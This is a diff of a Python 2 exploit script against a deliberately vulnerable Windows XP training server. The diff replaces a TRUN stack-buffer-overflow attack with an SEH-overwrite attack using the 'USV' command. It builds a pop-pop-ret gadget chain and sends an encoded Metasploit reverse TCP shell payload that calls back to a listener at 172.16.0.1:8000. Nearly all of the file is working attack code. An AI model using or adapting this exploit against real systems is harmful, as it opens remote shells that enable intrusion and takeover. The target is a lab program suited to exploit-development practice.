@@ -1,17 +1,13 @@
 """
 Tested OK against Windows XP [Version 5.1.2600] box
 
-BTW, get vulnserver from http://grey-corner.blogspot.fr/p/vulnserver.html
-
 (c) h4lf-jiffie (dohmatob elvis dopgima)
 """
 
 import os
 import sys
-import re
-import socket
-from codecs import escape_decode
 import struct
+import socket
 
 # elvis@hell:~/CODE/injektors$ msfpayload windows/shell_reverse_tcp LHOST=172.16.0.1 LPORT=8000 C
 # /*
@@ -46,36 +42,37 @@ reverse_tcp_EGG = (
 
 if __name__ == '__main__':
     # sanitize command-line
-    print "\r\n\t--[ %s by h4lf-jiffie (dohmatob elvis dopgima) ]--\r\n "%os.path.basename(sys.argv[0]) 
+    print "\r\n\t\t-+[ %s by h4lf-jiffie (dohmatob elvis dopgima) ]+-\r\n"%os.path.basename(sys.argv[0])
     if len(sys.argv) < 3:
         print 'Usage: python %s [OPTIONS] <target_IP> <target_PORT>'%(sys.argv[0])
         sys.exit(1)
     sys.path.append("../encoders")
     quine = __import__("quine")
 
-    # harvest egg
-    egg = quine.encode(reverse_tcp_EGG)
+    # set SEH record
+    pointer_to_next_SEH_record = 0x04EB4141 # = nop+nop+shortjmp 
+    SE_handler = 0x1B119FFC # = address of popr32+popr32+ret in msjet32.dll (this wll overwrite the existing handler)
+        
+    # sum-up SEH stuff
+    seh_gadget = struct.pack('<I', pointer_to_next_SEH_record) 
+    seh_gadget += struct.pack('<I', SE_handler)
 
     # setup socket
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soc.connect((sys.argv[1], int(sys.argv[2])))
-    
-    # build request
-    req_pkt = 'TRUN /.:/ ' # SPIKE fuzzer says we can screw'em this way!
-    req_pkt += 'U'*(2002 + 0xa - len(req_pkt)) # padding (NB: the length of the string 'TRUN /.:/ ' is 10)
-    req_pkt += struct.pack('<I', 0x625011F7) # offset = 2002 + 0xa: address of 'JMP ESP' in essfunc.dll
-    req_pkt += 'V'*(2006 + 0xa - len(req_pkt)) # padding
-    req_pkt += egg # offset = 2006 + 0xa: ESP points here
-    req_pkt += '\r\n'
 
-    # fire
-    print soc.recv(1024);
-    print 'REQUEST PKT (%d bytes):'%len(req_pkt)
-    print req_pkt
-    soc.send(req_pkt)
-     
+    # build request
+    probe_pkt = 'USV '
+    probe_pkt += 'A'*(966 - len(probe_pkt)) # alphanum padding 
+    probe_pkt += seh_gadget # pointer to next SEH record is overwritten 574 bytes into the request buffer
+    probe_pkt += quine.encode(reverse_tcp_EGG)
+    probe_pkt += 'A'*(2500 + 4 - len(probe_pkt)) # padding
+    probe_pkt += '\r\n\r\n'
+
+    # fuzz (sorry, I meant 'xploit')
+    print 'PROBE PACKET (%d bytes):'%len(probe_pkt)
+    print probe_pkt
+    soc.send(probe_pkt)
+
     # sanity
     soc.close()
-
-
-
